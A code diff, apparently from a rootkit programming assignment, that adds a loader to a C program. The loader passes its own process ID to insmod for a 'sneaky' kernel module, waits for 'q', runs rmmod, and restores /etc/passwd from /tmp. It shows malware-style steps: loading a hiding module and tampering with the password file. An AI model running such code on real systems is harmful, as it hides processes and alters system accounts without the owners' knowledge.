@@ -20,12 +20,37 @@ void addLine(){
 }
 
 //load the sneaky module (sneaky_mod.ko) using the “insmod” command
-void load_module(){
+void load_module() {
+    char arg[50];
+    sprintf(arg, "insmod sneaky_mod.ko pid=%d", (int)getpid());
+    system(arg);
+}
 
+//Enter a loop, reading a character at a time from the keyboard input until it receives the character ‘q’ (for quit). 
+void input(){
+  while (1) {
+    if(getchar() == 'q'){
+      break;
+    }
+  }
+}
+
+//Unload the sneaky kernel module using the “rmmod” command
+void unload(){
+  system("rmmod sneaky_mod");
+}
+
+//restore the /etc/passwd file
+void restore(){
+  system("cp /tmp/passwd /etc");
 }
 
 int main(int argc, char *argv[]){
   printID();
-  
+  addLine();
+  load_module();
+  input();
+  unload();
+  restore();
   return EXIT_SUCCESS;
 }
